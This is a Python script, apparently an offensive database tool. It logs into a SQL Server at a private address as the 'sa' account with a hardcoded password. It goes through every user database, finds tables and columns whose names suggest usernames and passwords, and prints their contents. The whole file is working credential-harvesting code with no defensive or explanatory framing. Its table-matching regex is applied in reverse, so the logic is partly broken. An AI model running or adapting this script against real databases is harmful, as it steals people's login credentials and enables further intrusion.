#!/usr/bin/env python
#coding:utf-8
#author:js2012
import pymssql
import re
#from check_sqlserver_user_Permission import main as test

#获取列名,组装列名
def get_str(list,column_user_flag,column_pass_flag):
    l = []
    for i in list:
        pattern = re.compile(r'.*?%s.*?'%i, re.I)
        if re.search(pattern,str(column_user_flag)):
            l.append('username:'+str(i[0]))
        elif re.search(pattern,str(column_pass_flag)):
            l.append('password:'+str(i[0]))
        else:
            pass
    return l

def get_value(l):
    t_list = []
    for i in l:
        if isinstance(i,list):
            for j in i:
                t_list.append(str(j[0]).strip())
        else:
            t_list.append(str(i[0]).strip())

    return t_list
#获取所有数据库
def get_all_database(cursor):
    sql="""SELECT name FROM  master..sysdatabases WHERE name NOT IN ( 'master', 'model', 'msdb', 'tempdb', 'northwind','pubs')"""
    l = cursor.execute(sql)
    l = cursor.fetchall()
    db_list = []
    for db in l:
        db_list.append(str(db[0]))
    return db_list
#获取用户名密码
def Get_All(param):
    result = {
        "username":None,
        "password":None
    }
    cursor = param['cursor']
    #db_name = param['db_name']
    table_flag = ['admin','userinfo','gl','user','manage','manager','system','master','users','sys']
    column_user_flag = ['user','uname','admin','user_name','username','u_name']
    coulmn_pass_flag = ['password','pass','user_password',"upass",'user_pass','passwd']
    #获取当前数据库的表
    table_sql = "select name from sysobjects where xtype='u'"
    cursor.execute(table_sql)
    table_name = cursor.fetchall()
    #print table_name
    table_list = []
    for t in table_name:
        for flag in table_flag:
            pattern = re.compile(r'.*%s.*'%str(t[0]),re.M|re.I)
            if re.search(pattern,flag):
                if t[0] not in table_list:
                    table_list.append(t[0])
    #print table_list

    table_sql_list = []

    #获取当前数据库的列
    for t_name in table_list:
        sql = "Select Name FROM SysColumns Where id=Object_Id('{}')".format(t_name)
        table_sql_list.append(sql)

    #print table_sql_list

    columns_dic = {}
    table_pattern = re.compile(r'Id\((.*?)\)')
    for t_sql in table_sql_list:
        #print t_sql
        i = re.search(table_pattern,t_sql).group(1).replace("'","")
        cursor.execute(t_sql)
        columns_dic[i] = cursor.fetchall()
    new_columns_dic = {}
    for d in columns_dic.keys():
        new_columns_dic[d] = get_str(columns_dic[d],column_user_flag,coulmn_pass_flag)
    #for d in  new_columns_dic:
    #print new_columns_dic
    column_contetn_dic ={}
    # for d in new_columns_dic.keys():
    #     for c in new_columns_dic[d]:
    #         sql  = ""
    sql_list = []
    for d in new_columns_dic.keys():
        for c in new_columns_dic[d]:
            sql = "select %s from [dbo].[%s]"%(c.split(":")[1],d)
            sql_list.append(c.split(":")[0]+":"+sql)
            #sql_dic[c.split(':')[0]] =  ":"+sql

    #print sql_list
    content_dic = {}
    content_dic['username'] = []
    content_dic['password'] = []
    for sq in sql_list:
        sq_1 = sq.split(":")[1]
        cursor.execute(sq_1)
        c = cursor.fetchall()
        #print cursor.fetchall()
        if sq.split(":")[0] == "username" and  c !=[]:
            content_dic['username'].append(c)
        elif sq.split(":")[0] == "password" and c !=[]:
            content_dic['password'].append(c)
        else:
            pass
   # print content_dic
    result['username'] = get_value(content_dic['username'])
    result['password'] = get_value(content_dic['password'])
    return result


conn = pymssql.connect('172.20.10.4','sa','mima',charset="utf8", autocommit=True)

cursor = conn.cursor()

db_list = get_all_database(cursor)

for db in db_list:
    conn = pymssql.connect('172.20.10.4', 'sa', 'mima',db,charset="utf8", autocommit=True)
    cursor = conn.cursor()
    param = {
        'cursor':cursor
    }
    print Get_All(param)